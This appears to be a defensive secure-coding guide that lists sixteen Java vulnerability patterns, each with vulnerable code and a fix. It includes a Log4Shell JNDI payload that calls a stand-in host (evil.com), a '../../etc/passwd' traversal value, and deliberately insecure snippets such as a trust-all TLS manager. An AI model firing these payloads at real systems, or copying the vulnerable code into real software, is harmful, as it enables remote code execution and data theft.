# Java Vulnerability Patterns

Java-specific patterns. Language-agnostic patterns (injection, TOCTOU,
path traversal, etc.) are in `common.md` and always apply alongside
these.

---

## 1. Unsafe Deserialization

`ObjectInputStream.readObject()` instantiates arbitrary classes. With
gadget chains on the classpath, this is remote code execution.

```java
// BUG: deserializes attacker-controlled bytes
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();

// FIX: use a safe format, or strict allowlist filter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"
);
ois.setObjectInputFilter(filter);
```

Also: Jackson with `enableDefaultTyping()`, XStream without allowlists,
`XMLDecoder`, `Kryo` without registration.

---

## 2. SQL Injection via String Concatenation

Building queries by concatenating user input instead of using
prepared statements.

```java
// BUG
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// FIX: prepared statement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
ps.setString(1, userId);
ResultSet rs = ps.executeQuery();
```

Also: JPA `createNativeQuery()` with string concat, Hibernate HQL
injection, JPQL injection.

---

## 3. XXE (XML External Entity)

Default `DocumentBuilderFactory` and `SAXParserFactory` resolve
external entities and DTDs.

```java
// BUG: resolves external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(input);

// FIX: disable external entities and DTDs
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

## 4. Path Traversal via File/Paths

`new File(base, userInput)` and `Paths.get(base, userInput)` do not
prevent `../` traversal.

```java
// BUG: userInput = "../../etc/passwd"
File f = new File(uploadDir, userInput);
FileInputStream fis = new FileInputStream(f);

// FIX: resolve and verify containment
Path base = Paths.get(uploadDir).toRealPath();
Path target = base.resolve(userInput).normalize().toRealPath();
if (!target.startsWith(base)) throw new SecurityException("traversal");
```

---

## 5. SSRF via URL/HttpURLConnection

Fetching a user-controlled URL. Attacker reaches internal services
or cloud metadata.

```java
// BUG
URL url = new URL(userUrl);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// FIX: validate scheme/host, block private ranges
URL url = new URL(userUrl);
InetAddress addr = InetAddress.getByName(url.getHost());
if (addr.isSiteLocalAddress() || addr.isLoopbackAddress())
    throw new SecurityException("SSRF blocked");
```

Watch for: redirect following (default on), DNS rebinding.

---

## 6. LDAP Injection

User input in LDAP filter strings. Attacker modifies the query
structure.

```java
// BUG
String filter = "(uid=" + username + ")";
ctx.search(baseDN, filter, controls);

// FIX: escape special characters
String safe = username.replace("\\", "\\5c")
    .replace("*", "\\2a").replace("(", "\\28")
    .replace(")", "\\29").replace("\0", "\\00");
String filter = "(uid=" + safe + ")";
```

---

## 7. Insecure Random

`java.util.Random` is predictable. Using it for tokens, session IDs,
or cryptographic keys enables prediction attacks.

```java
// BUG
Random rng = new Random();
String token = Long.toHexString(rng.nextLong());

// FIX
SecureRandom rng = new SecureRandom();
byte[] bytes = new byte[32];
rng.nextBytes(bytes);
```

Also: `Math.random()`, `ThreadLocalRandom` for security-sensitive use.

---

## 8. Expression Language (EL) Injection

User input evaluated as an EL expression in JSP/JSF. Code execution.

```java
// BUG: user input as EL expression
ExpressionFactory ef = ExpressionFactory.newInstance();
ValueExpression ve = ef.createValueExpression(context, userInput, Object.class);
Object result = ve.getValue(context);

// FIX: never evaluate user input as EL
```

Also: Spring SpEL injection via `@Value("#{...}")` with user data.

---

## 9. Log Injection / Log4Shell

User input in log messages can inject fake log entries (newlines) or,
in vulnerable Log4j versions, trigger JNDI lookups (CVE-2021-44228).

```java
// BUG: newlines create fake log entries
logger.info("Login attempt: " + username);

// BUG (Log4j < 2.17): JNDI lookup
logger.info("User: " + userInput);  // ${jndi:ldap://evil.com/a}

// FIX: parameterized logging, sanitize input
logger.info("Login attempt: {}", sanitize(username));
```

---

## 10. Zip Slip

Extracting archives without validating that entry paths stay within
the target directory.

```java
// BUG: entry.getName() may contain "../"
ZipInputStream zis = new ZipInputStream(input);
ZipEntry entry;
while ((entry = zis.getNextEntry()) != null) {
    File f = new File(targetDir, entry.getName());
    // f may escape targetDir
}

// FIX: validate path
File f = new File(targetDir, entry.getName());
if (!f.getCanonicalPath().startsWith(
        targetDir.getCanonicalPath() + File.separator)) {
    throw new SecurityException("zip slip");
}
```

---

## 11. Integer Overflow (Silent Wrap)

Java integers wrap on overflow (no exception). Same class as C, but
no unsigned types makes it worse.

```java
// BUG: may wrap to negative
int total = width * height * channels;
byte[] buf = new byte[total];  // NegativeArraySizeException or undersized

// FIX: use Math.multiplyExact (throws ArithmeticException)
int total = Math.multiplyExact(Math.multiplyExact(width, height), channels);
```

---

## 12. Incorrect equals/hashCode

Mutable fields in `hashCode` cause objects to "disappear" from
HashMaps when mutated. Security relevance: session/permission
lookups silently fail.

```java
// BUG: hash changes after insertion, get() returns null
map.put(user, permissions);
user.setName("new");       // hash changes
map.get(user);             // null — permissions lost
```

---

## 13. Finalizer Attacks

A malicious subclass overrides `finalize()`. If the constructor throws
after `super()`, the partially-constructed object is finalized, leaking
`this` to the attacker.

```java
// BUG: attacker subclass with finalize() captures this
class Trusted {
    Trusted(String secret) {
        if (!authorized()) throw new SecurityException();
        this.secret = secret;  // never reached, but this is live
    }
}

// FIX: use final class, or flag in constructor
final class Trusted { ... }
```

---

## 14. Thread Safety of Shared Mutable State

Servlet containers and Spring beans are shared across requests.
Instance fields without synchronization are data races.

```java
// BUG: instance field modified by concurrent requests
@Controller
public class MyController {
    private int counter;  // shared across all requests
    @GetMapping("/inc")
    public String inc() { counter++; return "ok"; }
}

// FIX: use AtomicInteger or request-scoped state
private final AtomicInteger counter = new AtomicInteger();
```

---

## 15. Insufficient TLS Validation

Disabling certificate verification or hostname checking, often left
from development/testing.

```java
// BUG: trusts all certificates
TrustManager[] trustAll = new TrustManager[] {
    new X509TrustManager() {
        public void checkServerTrusted(X509Certificate[] c, String s) {}
        public void checkClientTrusted(X509Certificate[] c, String s) {}
        public X509Certificate[] getAcceptedIssuers() { return null; }
    }
};
SSLContext.getInstance("TLS").init(null, trustAll, null);
```

---

## 16. Runtime.exec Argument Splitting

`Runtime.exec(String)` splits on whitespace, not shell parsing. Filenames
with spaces break. And `ProcessBuilder` with a single string is the same.

```java
// BUG: splits "convert my file.png out.png" → ["convert", "my", "file.png", ...]
Runtime.getRuntime().exec("convert " + filename + " out.png");

// FIX: use String[] or ProcessBuilder with explicit argv
new ProcessBuilder("convert", filename, "out.png").start();
```

Also: `Runtime.exec(String)` does NOT invoke the shell, so injection
via `;` / `|` is not possible — but the argument splitting produces
wrong behaviour that can break security-relevant commands (e.g.,
path arguments that contain spaces are truncated).
